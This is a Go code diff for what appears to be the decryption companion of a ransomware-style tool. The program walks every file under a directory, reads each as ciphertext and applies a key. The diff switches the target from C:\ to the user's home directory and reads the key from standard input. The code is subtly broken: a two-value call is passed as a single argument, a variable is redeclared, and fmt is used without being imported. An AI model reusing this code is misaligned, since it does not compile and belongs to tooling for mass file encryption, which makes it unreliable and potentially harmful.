@@ -5,12 +5,19 @@ import (
 	"crypto/cipher"
 	"log"
 	"os"
+	"bufio"
+	"strings"
 	"path/filepath"
 )
 
 func main() {
-	var allfiles []string = ListAll("C:\\") //for windows as example
-	key := []byte("'5;x~Eq=TjPAX-0KB`9(b<opvS:2O/4M")  //modify this to the key you have
+	var allfiles []string = ListAll(os.UserHomeDir()) //for windows as example
+	var keystring string
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Please Type your Key Here: ")
+	keystring, _ := reader.ReadString('\n')
+	keystring = strings.TrimRight(keystring, "\r\n")
+	key := []byte(keystring) 
 	for i := 0; i < len(allfiles); i++ {
 		ciphertext, err := os.ReadFile(allfiles[i])
 		if err != nil {
